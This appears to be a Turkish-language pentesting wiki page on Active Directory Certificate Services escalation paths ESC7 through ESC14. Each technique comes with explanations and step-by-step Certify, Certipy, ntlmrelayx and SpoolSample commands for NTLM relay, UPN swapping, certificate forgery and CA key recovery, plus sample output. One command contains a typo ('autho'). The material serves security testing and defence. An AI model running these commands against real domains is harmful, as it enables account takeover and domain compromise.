### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 kötüye kullanımlarına (EDITF özniteliklerini etkinleştirmek veya bekleyen istekleri onaylamak) ek olarak, **Certify 2.0**, Enterprise CA üzerinde yalnızca *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren yepyeni bir primitive ortaya çıkardı.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC yöntemi, *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Yöntem geleneksel olarak meşru CA’lar tarafından **bekleyen** isteklerdeki uzantıları güncellemek için kullanılsa da bir saldırgan, onay bekleyen bir isteğe **varsayılan olmayan bir sertifika uzantısı** (örneğin `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID’si) eklemek için bu yöntemi kötüye kullanabilir.

Hedeflenen template bu uzantı için **varsayılan bir değer tanımlamadığından**, istek sonunda verildiğinde CA saldırganın kontrolündeki değerin üzerine YAZMAZ. Bu nedenle ortaya çıkan sertifika, saldırganın seçtiği bir uzantıyı içerir ve bu uzantı şunları sağlayabilir:

* Diğer savunmasız template’lerin Application / Issuance Policy gereksinimlerini karşılayarak privilege escalation’a yol açabilir.
* Üçüncü taraf sistemlerde sertifikaya beklenmedik güven sağlayan ek EKU’lar veya policy’ler ekleyebilir.

Özetle, daha önce ESC7’nin “daha az güçlü” yarısı olarak kabul edilen *Manage Certificates*, artık CA yapılandırmasına dokunmadan veya daha kısıtlayıcı *Manage CA* yetkisini gerektirmeden tam privilege escalation ya da uzun süreli persistence için kullanılabilir.

#### Certify 2.0 ile primitive’in kötüye kullanılması

1. **Beklemede kalacak bir sertifika isteği gönderin.** Bu, manager approval gerektiren bir template ile sağlanabilir:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Yeni `manage-ca` komutunu kullanarak bekleyen isteğe özel bir uzantı ekleyin**:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Şablon *Certificate Issuance Policies* uzantısını zaten tanımlamıyorsa, yukarıdaki değer sertifika verildikten sonra korunur.*

3. **İsteği verin** (rolünüzde *Manage Certificates* onay hakları da varsa) veya bir operatörün isteği onaylamasını bekleyin. Sertifika verildikten sonra indirin:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Ortaya çıkan sertifika artık kötü amaçlı issuance-policy OID'sini içerir ve sonraki saldırılarda (örn. ESC13, domain escalation vb.) kullanılabilir.

> NOT: Aynı saldırı, Certipy ≥ 4.7 ile `ca` komutu ve `-set-extension` parametresi kullanılarak gerçekleştirilebilir.

## AD CS HTTP Endpoints'e NTLM Relay – ESC8

### Açıklama

> [!TIP]
> **AD CS'nin kurulu olduğu** ortamlarda, **savunmasız bir web enrollment endpoint'i** varsa ve **domain bilgisayarlarının enrollment yapmasına ve client authentication'a izin veren en az bir sertifika template'i yayımlanmışsa** (varsayılan **`Machine`** template'i gibi), spooler service'i etkin olan **herhangi bir bilgisayarın saldırgan tarafından ele geçirilmesi mümkün hâle gelir**!

AD CS, yöneticilerin yükleyebileceği ek server role'leri aracılığıyla sunulan, HTTP tabanlı çeşitli enrollment yöntemlerini destekler. HTTP tabanlı sertifika enrollment arayüzleri **NTLM relay saldırılarına** karşı savunmasızdır. Saldırgan, **ele geçirilmiş bir makineden, gelen NTLM aracılığıyla kimlik doğrulaması yapan herhangi bir AD hesabını taklit edebilir**. Saldırgan, kurban hesabını taklit ederken bu web arayüzlerine erişerek **`User` veya `Machine` sertifika template'lerini kullanıp client authentication sertifikası isteyebilir**.

- **Web enrollment arayüzü** (`http://<caserver>/certsrv/` adresinde bulunan eski bir ASP uygulaması), varsayılan olarak yalnızca HTTP kullanır ve NTLM relay saldırılarına karşı koruma sağlamaz. Ayrıca, Authorization HTTP header'ı üzerinden yalnızca NTLM kimlik doğrulamasına açıkça izin verir; bu da Kerberos gibi daha güvenli kimlik doğrulama yöntemlerini kullanılamaz hâle getirir.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service ve **Network Device Enrollment Service** (NDES), varsayılan olarak Authorization HTTP header'ı üzerinden negotiate authentication'ı destekler. Negotiate authentication hem Kerberos'u hem de **NTLM'yi desteklediğinden**, saldırgan relay saldırıları sırasında kimlik doğrulamayı **NTLM'ye düşürebilir**. Bu web servisleri varsayılan olarak HTTPS'yi etkinleştirse de HTTPS tek başına **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS servislerini NTLM relay saldırılarına karşı korumak, yalnızca HTTPS channel binding ile birlikte kullanıldığında mümkündür. Ne yazık ki AD CS, channel binding için gereken IIS üzerindeki Extended Protection for Authentication'ı etkinleştirmez.<sup>[[6]](#references)</sup>

NTLM relay saldırılarındaki yaygın bir **sorun**, NTLM oturumlarının **kısa süreli olması** ve saldırganın **NTLM signing gerektiren** servislerle etkileşim kuramamasıdır.

Bununla birlikte, kullanıcının sertifikasını elde etmek için NTLM relay saldırısından yararlanılarak bu sınırlama aşılabilir; çünkü oturumun süresini sertifikanın geçerlilik süresi belirler ve sertifika, **NTLM signing gerektiren** servislerle kullanılabilir. Çalınmış bir sertifikanın nasıl kullanılacağına ilişkin talimatlar için şuraya bakın:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay saldırılarındaki bir diğer sınırlama, **kurban hesabının saldırganın kontrolündeki bir makinede kimlik doğrulaması yapması gerekmesidir**. Saldırgan bu kimlik doğrulamayı bekleyebilir veya **zorlamaya** çalışabilir:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Kötüye Kullanım**

[**Certify**](https://github.com/GhostPack/Certify)’nin `cas` komutu **etkin HTTP AD CS endpoint'lerini** listeler:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Sertifika Yetkilileri (CA'lar) tarafından Certificate Enrollment Service (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar **Certutil.exe** aracı kullanılarak ayrıştırılıp listelenebilir:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile kötüye kullanım

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### [Certipy](https://github.com/ly4k/Certipy) ile kötüye kullanım

Sertifika isteği, varsayılan olarak Certipy tarafından `Machine` veya `User` şablonuna göre yapılır; hangi şablonun kullanılacağı, relay edilen hesap adının `$` ile bitip bitmediğine bağlıdır. Alternatif bir şablon belirtmek için `-template` parametresi kullanılabilir.

Kimlik doğrulamayı zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Etki alanı denetleyicileriyle çalışırken `-template DomainController` belirtilmelidir.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

ESC9 olarak adlandırılan **`msPKI-Enrollment-Flag`** değerindeki **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`), `szOID_NTDS_CA_SECURITY_EXT` SID uzantısının sertifikaya eklenmemesine neden olur. Eski ESC9 örnekleri, KDC uyumluluk davranışına (`StrongCertificateBindingEnforcement=1`) veya ayrı bir zayıf Schannel eşleme yöntemine dayanır. `1` değeri **geçmişte kullanılan bir uyumluluk ayarıdır**; güncel varsayılan değildir: Microsoft, KDC geçersiz kılma ayarının 9 Eylül 2025 tarihli Windows güvenlik güncellemesiyle desteklenmesinin sona erdiğini belirtiyor. Eski bir yöntemi uygulamadan önce hedefin gerçekten hangi güncellemeleri aldığını ve hangi kimlik doğrulama uç noktasını kullandığını kontrol edin.<sup>[[7]](#references)</sup> [Microsoft'un dağıtım kılavuzuna](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) bakın.

Bu bayrağın ayarının önem kazandığı koşullar şunlardır:

- Eski ve uyumlu bir KDC'de etkin sertifika bağlama ilkesi eşlemeye izin verir; alternatif olarak Schannel uç noktası, `CertificateMappingMethods` bit `0x4` üzerinden UPN eşlemesini ayrıca etkinleştirir.
- Sertifika, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağıyla işaretlenmiştir.
- Sertifikada herhangi bir istemci kimlik doğrulama EKU'su belirtilmiştir.
- Başka bir hesabı ele geçirmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcuttur.

### Kötüye Kullanım Senaryosu

`John@corp.local` kullanıcısının `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olduğunu ve amacın `Administrator@corp.local` hesabını ele geçirmek olduğunu varsayalım. `Jane@corp.local` kullanıcısının kayıt olmasına izin verilen `ESC9` sertifika şablonunun `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı yapılandırılmıştır.

Öncelikle, `John`'un `GenericWrite` izni sayesinde `Shadow Credentials` kullanılarak `Jane`'in hash'i elde edilir:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Daha sonra, `Jane`'in `userPrincipalName` değeri, `@corp.local` etki alanı kısmı bilerek atlanarak `Administrator` olarak değiştirilir:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Bu değişiklik, `Administrator@corp.local` değeri `Administrator` kullanıcısının `userPrincipalName` değerinden farklı kaldığı için kısıtları ihlal etmez.

Bunun ardından, savunmasız olarak işaretlenen `ESC9` sertifika şablonu Jane olarak talep edilir:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Sertifikanın `userPrincipalName` değerinin, herhangi bir “object SID” içermeden `Administrator`'ı yansıttığı belirtiliyor.

Ardından `Jane`'in `userPrincipalName` değeri özgün haline, `Jane@corp.local`'a döndürülüyor:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Verilen sertifikayla kimlik doğrulamayı denemek artık `Administrator@corp.local` kullanıcısının NT hash’ini verir. Sertifikada domain belirtilmediğinden komuta `-domain <domain>` eklenmelidir:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Weak Certificate Mappings - ESC10

### Açıklama

ESC10 kapsamında genellikle iki ayrı sertifika eşleme ilkesi ele alınır. İlgili kimlik doğrulamayı gerçekten gerçekleştiren uç noktadaki ayarı kontrol edin:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altındaki Schannel `CertificateMappingMethods`, uygulama sunucusundaki TLS istemci sertifikası eşlemesini denetler. UPN biti `0x4` değeridir; güncellenmiş sistemlerde varsayılan değer `0x18` (`0x8 | 0x10`) şeklindedir.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altındaki KDC `StrongCertificateBindingEnforcement`, geçmişte Kerberos sertifika bağlama uyumluluğunu denetliyordu. `1` değeri güncel ve güvenilir bir varsayılan değildir ve Microsoft, 9 Eylül 2025 tarihli Windows güvenlik güncellemesiyle bu geçersiz kılma ayarına yönelik desteği sonlandırdı. Bu ayarın durumu tek başına Schannel'ın UPN eşlemesini açıklamaz.<sup>[[7]](#references)</sup>

**Durum 1**

Geçmişte, eski bir KDC `StrongCertificateBindingEnforcement=0` ayarını dikkate alıyordu; geçersiz kılma ayarı güncel yamalı sistemlerde artık desteklenmediğinden güncelleme düzeyini doğrulayın.

**Durum 2**

Schannel istemci sertifikası uç noktasında `CertificateMappingMethods` UPN biti (`0x4`) etkin olduğunda. Bu, KDC güçlü bağlama denetiminden ayrı bir ayardır ve yine de kaydedilebilir bir istemci kimlik doğrulama sertifikasının yanı sıra eşlenen hesap özniteliği üzerinde etkin denetim gerektirir.

### Kötüye Kullanım Durumu 1

KDC'nin hâlâ `StrongCertificateBindingEnforcement=0` ayarını dikkate aldığı eski bir dağıtımda, bir hesabın `userPrincipalName` özniteliği üzerindeki denetim, başka bir hesaba yönelik zayıf eşleme yolunun bir parçası olabilir. Gerekli sertifika kaydı, eşleme, hedef kimlik ve başarılı kimlik doğrulama ayrı ayrı doğrulanmalıdır; tek başına bir `GenericWrite` ACE'si veya kayıt defteri değeri, hesabın ele geçirilebileceğini kanıtlamaz.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan bir saldırgan, `Administrator@corp.local` hesabını ele geçirmeyi hedefler. Prosedür, herhangi bir sertifika şablonunun kullanılmasına olanak tanıyan ESC9 yöntemini izler.

İlk olarak, `GenericWrite` izninden yararlanılarak Shadow Credentials aracılığıyla `Jane`'in hash'i elde edilir.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Ardından, kısıtlama ihlalini önlemek için `@corp.local` kısmı bilerek atlanarak `Jane`'in `userPrincipalName` değeri `Administrator` olarak değiştirilir.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Bunun ardından, istemci kimlik doğrulamasını etkinleştiren bir sertifika, varsayılan `User` şablonu kullanılarak `Jane` olarak talep edilir.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'in `userPrincipalName` değeri daha sonra özgün hali olan `Jane@corp.local` olarak geri alınır.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Elde edilen sertifikayla kimlik doğrulaması, `Administrator@corp.local` kullanıcısının NT hash’ini verir; sertifikada etki alanı bilgileri bulunmadığından, komutta etki alanının belirtilmesi gerekir.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Kötüye Kullanım Senaryosu 2

`CertificateMappingMethods`, `UPN` bit bayrağını (`0x4`) içerdiğinde, `GenericWrite` izinlerine sahip A hesabı; makine hesapları ve yerleşik etki alanı yöneticisi `Administrator` dâhil, `userPrincipalName` özelliği bulunmayan tüm B hesaplarını ele geçirebilir.

Buradaki amaç, `GenericWrite` izninden yararlanarak önce Shadow Credentials üzerinden `Jane`'in hash'ini elde etmek ve ardından `DC$@corp.local` hesabını ele geçirmektir.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane`'in `userPrincipalName` değeri ardından `DC$@corp.local` olarak ayarlanır.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

İstemci kimlik doğrulaması için varsayılan `User` şablonu kullanılarak `Jane` adına bir sertifika istenir.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'in `userPrincipalName` değeri bu işlemden sonra özgün haline döndürülür.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Schannel üzerinden kimlik doğrulamak için Certipy’nin `-ldap-shell` seçeneği kullanılır; `u:CORP\DC$` ifadesi kimlik doğrulamanın başarılı olduğunu gösterir.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

LDAP shell üzerinden `set_rbcd` gibi komutlar, Resource-Based Constrained Delegation (RBCD) saldırılarını mümkün kılar ve etki alanı denetleyicisinin ele geçirilmesine yol açabilir.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Bu güvenlik açığı, `userPrincipalName` değeri olmayan veya bu değeri `sAMAccountName` ile eşleşmeyen tüm kullanıcı hesaplarını da etkiler. Varsayılan olarak `userPrincipalName` değeri bulunmayan ve yükseltilmiş LDAP ayrıcalıklarına sahip olan `Administrator@corp.local` hesabı özellikle cazip bir hedeftir.

## NTLM'yi ICPR'ye yönlendirme - ESC11

### Açıklama

CA Server `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC hizmeti üzerinden imzalama olmadan NTLM relay saldırıları gerçekleştirilebilir. [Buradaki referansa bakın](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`Enforce Encryption for Requests` ayarının devre dışı olup olmadığını tespit etmek için `certipy` kullanabilirsiniz; certipy `ESC11` güvenlik açıklarını gösterecektir.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Abuse Senaryosu

Bir relay sunucusu kurmak gerekir:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Not: Etki alanı denetleyicileri için DomainController'da `-template` belirtmeliyiz.

Ya da [sploutchy'nin impacket fork'unu](https://github.com/sploutchy/impacket) kullanarak:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## ADCS CA'ya YubiHSM ile Shell access - ESC12

### Açıklama

Yöneticiler, Sertifika Yetkilisini sertifikaları "Yubico YubiHSM2" gibi harici bir cihazda depolayacak şekilde yapılandırabilir.

USB cihazı CA sunucusuna bir USB bağlantı noktası üzerinden bağlandığında veya CA sunucusu sanal makineyse bir USB device server kullanıldığında, Key Storage Provider'ın YubiHSM'de anahtar oluşturup kullanabilmesi için bir kimlik doğrulama anahtarı (bazen "parola" olarak da adlandırılır) gerekir.

Bu anahtar/parola, `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kayıt defteri girdisinde açık metin olarak saklanır.

[Buradaki](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) referansa bakın.<sup>[[11]](#references)</sup>

### Kötüye Kullanım Senaryosu

Shell access elde ettiğinizde CA'nın özel anahtarı fiziksel bir USB cihazında saklanıyorsa, anahtarı kurtarmak mümkündür.

Öncelikle CA sertifikasını (bu herkese açıktır) edinmeniz gerekir, ardından:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Son olarak, CA sertifikasını ve özel anahtarını kullanarak yeni bir keyfi sertifika oluşturmak için certutil `-sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Açıklama

`msPKI-Certificate-Policy` özniteliği, sertifika şablonuna issuance policy eklenmesini sağlar. Issuance policy oluşturmaktan sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID kapsayıcısının Configuration Naming Context'indeki (CN=OID,CN=Public Key Services,CN=Services) nesneler arasında bulunabilir. Bir policy, bu nesnenin `msDS-OIDToGroupLink` özniteliği kullanılarak bir AD grubuna bağlanabilir. Böylece sistem, sertifikayı sunan bir kullanıcıyı o grubun üyesiymiş gibi yetkilendirebilir. [Buradaki referans](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Başka bir deyişle, bir kullanıcının sertifika kaydetme izni varsa ve sertifika bir OID grubuna bağlıysa kullanıcı bu grubun ayrıcalıklarını devralabilir.

OIDToGroupLink'i bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Kötüye Kullanım Senaryosu

`certipy find` veya `Certify.exe find /showAllPermissions` kullanarak kullanıcının sahip olduğu bir izni bulun.

`John`, `VulnerableTemplate` için kayıt olma iznine sahipse `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Tek yapması gereken şablonu belirtmektir; OIDToGroupLink haklarına sahip bir sertifika alır.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Açık Sertifika Eşleme İstismarları — ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama oldukça kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.<sup>[[14]](#references)</sup>

ESC14, öncelikle Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` özniteliğinin kötüye kullanılması ya da güvenli olmayan şekilde yapılandırılması yoluyla ortaya çıkan "zayıf açık sertifika eşlemesi" güvenlik açıklarını ele alır. Çok değerli bu öznitelik, yöneticilerin kimlik doğrulama amacıyla X.509 sertifikalarını bir AD hesabıyla manuel olarak ilişkilendirmesine olanak tanır. Bu açık eşlemeler tanımlandığında, genellikle sertifikanın SAN alanındaki UPN'lere veya DNS adlarına ya da `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısına gömülü SID'ye dayanan varsayılan sertifika eşleme mantığını geçersiz kılabilir.

`altSecurityIdentities` özniteliğinde bir sertifikayı tanımlamak için kullanılan dize değeri fazla genel, kolayca tahmin edilebilir, benzersiz olmayan sertifika alanlarına dayalı veya kolayca taklit edilebilen sertifika bileşenlerini kullanan bir eşleme "zayıf" olarak nitelendirilir. Bir saldırgan ayrıcalıklı bir hesap için zayıf biçimde tanımlanmış böyle bir açık eşlemeyle eşleşen bir sertifikayı elde edebilir veya oluşturabilirse, bu sertifikayı kullanarak söz konusu hesap adına kimlik doğrulayabilir ve hesabı taklit edebilir.

Potansiyel olarak zayıf `altSecurityIdentities` eşleme dizelerine örnekler:

- Yalnızca ortak bir Subject Common Name (CN) üzerinden eşleme: ör. `X509:<S>CN=SomeUser`. Saldırgan bu CN'ye sahip bir sertifikayı daha az güvenli bir kaynaktan edinebilir.
- Belirli bir seri numarası veya subject key identifier gibi ek bir niteleyici olmadan, fazla genel Issuer Distinguished Name (DN) veya Subject DN kullanma: ör. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Bir saldırganın yasal olarak edinebileceği veya oluşturabileceği (bir CA'yı ele geçirmişse ya da ESC1'deki gibi savunmasız bir şablon bulmuşsa) bir sertifikada karşılayabileceği diğer tahmin edilebilir kalıpları veya kriptografik olmayan tanımlayıcıları kullanma.

`altSecurityIdentities` özniteliği eşleme için çeşitli biçimleri destekler. Örneğin:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN üzerinden eşler)
- `X509:<SKI>SubjectKeyIdentifier` (sertifikanın Subject Key Identifier uzantı değerine göre eşler)
- `X509:<SR>SerialNumberBackedByIssuerDN` (seri numarasına göre eşler ve Issuer DN ile örtük olarak nitelenir) - bu standart bir biçim değildir; genellikle `<I>IssuerDN<SR>SerialNumber` kullanılır.
- `X509:<RFC822>EmailAddress` (SAN'daki RFC822 adına, genellikle bir e-posta adresine göre eşler)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (sertifikanın ham public key değerinin SHA1 özeti üzerinden eşler - genellikle güçlüdür)

Bu eşlemelerin güvenliği, eşlemede kullanılan tanımlayıcılara bağlıdır. Microsoft, `X509:<RFC822>` dahil olmak üzere e-posta veya subject adlarına dayalı eşlemeleri **zayıf** olarak sınıflandırır. Full Enforcement modunda güçlü eşlemesi olmayan bir sertifika reddedilir; Eylül 2025 Windows güvenlik güncelleştirmesi Compatibility moduna dönme seçeneğini kaldırmıştır. Bu nedenle yalnızca zayıf bir eşleme, günümüzde güvenilir bir taklit yöntemi değildir. Zayıf eşleme senaryosunu değerlendirirken domain controller'ın gerçek yama düzeyini ve sertifika eşleme davranışını kontrol edin. `altSecurityIdentities` üzerinde yazma izni ayrı bir araştırma ipucudur: uygun ve güvenilir bir sertifikaya sahip saldırgan, etkin izinlere ve sertifika doğrulamasına bağlı olarak **güçlü** bir açık eşleme ekleyebilir. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) ve [ESC14 araştırmasına](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/) bakın.

Sertifika kimlik doğrulama hatalarının da tanısı konmalıdır: hedef hesabın devre dışı olması veya parolasının süresinin dolması, sertifika geçerliliğini korusa bile oturum açmayı engelleyebilir.

### İstismar Senaryosu

ESC14, Active Directory'deki (AD) **açık sertifika eşlemelerini**, özellikle de `altSecurityIdentities` özniteliğini hedef alır. Bu öznitelik ayarlanmışsa (tasarım gereği veya yanlış yapılandırma nedeniyle), saldırganlar eşlemeyle uyuşan sertifikaları sunarak hesapları taklit edebilir.

#### Senaryo A: Saldırgan `altSecurityIdentities` Özniteliğine Yazabilir

 **Ön koşul**: Saldırganın hedef hesabın `altSecurityIdentities` özniteliğine yazma izni veya hedef AD nesnesi üzerinde aşağıdaki izinlerden biri aracılığıyla bu izni verme yetkisi vardır:  
- `altSecurityIdentities` özniteliğine Write property  
- `Public-Information` için Write property  
- Tümü için Write property  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Senaryo B: Hedefte X509RFC822 (E-posta) Üzerinden Zayıf Eşleme Var

- **Tarihsel/koşullu ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509RFC822 eşlemesi vardır, saldırgan bir enrollee'nin `mail` özniteliğini düzenleyebilir ve uygun bir şablon, çakışan bir SID bağlaması olmadan bu e-posta adresini client-authentication sertifikasına ekler. Kimlik doğrulama için ayrıca ortamın hâlâ zayıf eşlemeyi kabul etmesi gerekir; Full Enforcement yalnızca zayıf eşlemeye sahip sertifikaları reddeder. Tek başına yazılabilir bir `mail` özniteliği yalnızca bir araştırma ipucudur.
#### Senaryo C: Hedefte X509IssuerSubject Eşlemesi Var

- **Ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509IssuerSubject açık eşlemesi vardır. Saldırgan, bir kurban principal üzerindeki `cn` veya `dNSHostName` özniteliğini hedefin X509IssuerSubject eşlemesinin subject değeriyle eşleşecek şekilde ayarlayabilir. Ardından saldırgan kurban olarak sertifika alabilir ve bu sertifikayı hedef adına kimlik doğrulamak için kullanabilir.
#### Senaryo D: Hedefte X509SubjectOnly Eşlemesi Var

